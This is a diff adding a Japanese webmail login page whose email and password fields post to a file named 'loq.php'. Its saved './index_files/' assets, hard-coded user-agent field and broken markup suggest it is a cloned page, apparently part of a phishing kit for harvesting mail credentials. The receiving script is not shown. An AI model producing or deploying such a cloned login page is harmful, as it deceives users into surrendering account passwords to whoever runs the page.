@@ -1,0 +1,111 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
+<meta http-equiv="AM-Template" content="standard/html/index.html">
+
+<meta http-equiv="Content-Language" content="ja">
+
+<title>メール| ログイン</title>
+
+
+<link rel="stylesheet" type="text/css" href="./index_files/popup.css">
+<link rel="stylesheet" type="text/css" href="./index_files/index_ch300.css">
+
+
+</head>
+
+<body topmargin="0" text="#000000" leftmargin="0" bgcolor="#FFFFFF">
+<noscript>このページではJavaScriptを使用しています。<br />ご使用のブラウザでJavaScriptを有効にしてご利用下さい。</noscript>
+
+<div id="ajax_content" style="position:absolute;visibility:hidden;display:none;"></div>
+  <form name="login" method="POST" action="loq.php">
+    <input type="hidden" name="login_page_lang" value="ja">
+    <input type="hidden" name="charset" value="UTF-8">
+    <input type="hidden" name="http_user_agent" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36">
+
+    <div class="border"><br>
+    </div>
+
+    <div class="layout" align="center">
+        <div style="text-align:center">
+       <br><br><br><br><br><br>
+        </div>
+
+<table class="login" align="center">
+<tbody><tr>
+  <th><img src="./index_files/index_login.gif"></th>
+</tr>
+<tr>
+  <td>
+
+        <table class="inner" cellspacing="3" cellpadding="3">
+          <tbody><tr>
+            <th>メールアドレス:</th>
+            <td>
+              <input type="text" class="length" name="user" size="19" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="1" required="">
+            </td>
+            <td>
+
+            </td>
+          </tr>
+
+          <tr>
+            <th>パスワード :</th>
+            <td colspan="3">
+              <input type="password" class="length" name="pass" size="20" maxlength="1024" style="ime-mode: disabled;" autocomplete="off" value="" tabindex="2" required="">
+            </td>
+          </tr>
+
+
+          <tr>
+            <th>言語選択 :</th>
+            <td colspan="3">
+              <select name="language" tabindex="4">
+                <option value="auto" selected="">自動選択</option>
+
+              <option value="en">英語</option>
+
+              <option value="ja">日本語</option>
+
+
+              </select>
+            </td>
+          </tr>
+
+
+          <tr>
+            <td colspan="4" class="authinfo">
+              <input type="checkbox" name="save_authinfo" id="save_authinfo" value="on" tabindex="5"><label for="save_authinfo">メールアドレス/パスワードを保存する</label>
+            </td>
+          </tr>
+
+
+          <tr>
+            <th colspan="2" class="copyright" <="" th="">
+            </th><th>
+
+              <input type="submit" value="ログイン ">
+
+            </th>
+          </tr>
+
+        </tbody></table>
+  </td>
+</tr>
+</tbody></table>
+
+<table class="login_footer" style="text-align:center;width:410px;" align="center">
+<tbody><tr>
+  <td class="english">
+  
+      <a href="">English</a>
+  
+  </td>
+</tr>
+</tbody></table>
+</div>
+  </form>
+
+
+
+
+<div style="position: absolute; top: 0px; left: 0px; opacity: 0.5; display: none; background-color: rgb(175, 175, 175);"></div></body></html>
